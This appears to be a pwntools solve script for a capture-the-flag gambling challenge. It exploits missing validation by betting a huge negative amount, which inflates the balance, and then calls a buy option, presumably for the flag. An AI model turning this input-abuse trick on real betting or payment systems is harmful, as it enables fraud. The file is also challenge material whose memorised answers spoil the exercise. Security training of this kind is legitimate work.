from pwn import *
from config import REMOTE_ADDR, REMOTE_PORT

REMOTE = 0 # Change to 1 to run the exploit on the remote instance

if REMOTE:
    p = remote(REMOTE_ADDR, REMOTE_PORT)
else:
    p = process(["python3", "src.py"])

io = r = p # use whichever you like for communication

def buy():
    p.sendlineafter(b"Choice? ", b"1")
    return p.recvline()

def gamble(amount, number):
    p.sendlineafter(b"Choice? ", b"2")
    p.sendlineafter(b"Amount? ", str(amount).encode())
    p.sendlineafter(b"number? ", str(number).encode())
    p.recvline()
    return p.recvline()

print(gamble(-1000000000000000, 1))
print(buy())


